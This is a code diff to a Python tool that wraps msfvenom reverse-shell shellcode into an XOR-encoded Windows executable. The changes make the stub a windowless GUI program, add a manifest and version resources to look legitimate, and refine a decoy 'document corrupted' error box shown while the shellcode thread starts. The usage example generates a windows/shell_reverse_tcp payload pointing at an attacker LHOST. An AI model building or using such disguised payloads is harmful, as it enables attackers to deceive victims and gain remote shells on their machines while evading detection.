@@ -3,7 +3,7 @@ XOR-encoded shellcode wrapper for Windows x86-32 (works fine on x86-64)
 
 Example:
 $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
-   2>/dev/null | python xor-payload.py --excel
+   2>/dev/null | python xor-payload.py -p excel
 
 @_hugsy_
 
@@ -36,14 +36,38 @@ def echo(fd, m):
         os.fsync(fd)
         return
 
+def create_application_manifest():
+        with open("/tmp/Application.manifest", "w") as f:
+                f.write("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+ <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+  <security>
+   <requestedPrivileges>
+    <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+   </requestedPrivileges>
+  </security>
+ </trustInfo>
+ <dependency>
+  <dependentAssembly>
+   <assemblyIdentity type="Win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0"
+                     processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/>
+  </dependentAssembly>
+ </dependency>
+</assembly>""")
+        return
+
 def create_resource_file( profile_index ):
+        create_application_manifest()
+
         prof = PROFILES[ profile_index ]
         fd, cname = tempfile.mkstemp(suffix=".rc")
         with os.fdopen(fd, 'w') as f:
                 f.write("""id ICON "{0}"
+CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST "/tmp/Application.manifest"
 1 VERSIONINFO
-FILEVERSION     {1}
-PRODUCTVERSION  {1}
+FILEVERSION      {1}
+PRODUCTVERSION   {1}
+FILEFLAGS        0
 BEGIN
   BLOCK "StringFileInfo"
   BEGIN
@@ -77,7 +101,7 @@ def generate_code_file(fd, key):
         #include <time.h>
         #include <ctype.h>
         #include <windows.h>
-        //#define DEBUG
+        #undef DEBUG
 
         #define BIG_NUMBER 100000000
         """)
@@ -137,7 +161,8 @@ def generate_code_file(fd, key):
           for(i=0; i<len; i++){code[i] ^= key++; key %= 256;}
           for(j=BIG_NUMBER; j; j--){}
         }
-        int main(int argc, char** argv, char** envp)
+        //int main(int argc, char** argv, char** envp)
+        int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
         {
           int len;
           DWORD pID;
@@ -175,8 +200,10 @@ def generate_code_file(fd, key):
 #endif
           MessageBoxA(NULL,
                       "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
-                      "If this happened for the first time, you can try re-opening the document.",
-                      "Windows Error.\\nError code: 0xffffff96",
+                      "If this happened for the first time, try re-opening the document."
+                      "\\n\\nError code: 0xffffff96"
+                      ,
+                      "Windows Error",
                       MB_ICONERROR | MB_OK);
           hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
 
@@ -236,13 +263,14 @@ if __name__ == "__main__":
         else:
                 ename = args.output
 
-        cmd = "cd {} && wine ./gcc.exe {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
+        cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
         if not quiet_mode: print("[+] Compiling '{}'->'{}'".format(cname, ename))
         ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
         if not quiet_mode: print("[+] Generation completed '{}', removing resources...".format(ename))
 
 	if profile_name is not None:
 		os.unlink(res_o)
+                os.unlink("/tmp/Application.manifest")
 
         os.unlink(cname)
 
